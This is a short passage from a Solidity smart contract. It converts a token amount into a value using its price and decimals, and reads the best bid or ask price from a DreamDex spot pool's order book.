        if (price == 0) return (false, 0);
        uint8 dec = (asset == NATIVE || asset == address(0)) ? 18 : IERC20(asset).decimals();
        return (true, (amount * price) / (10 ** dec));
    }

    function _best(address pool, bool isBid) internal view returns (uint256) {
        IDreamDexSpotPool.BookLevel[] memory levels = IDreamDexSpotPool(pool).getBookLevels(isBid, 1);
        return levels.length == 0 ? 0 : levels[0].price;
    }
}
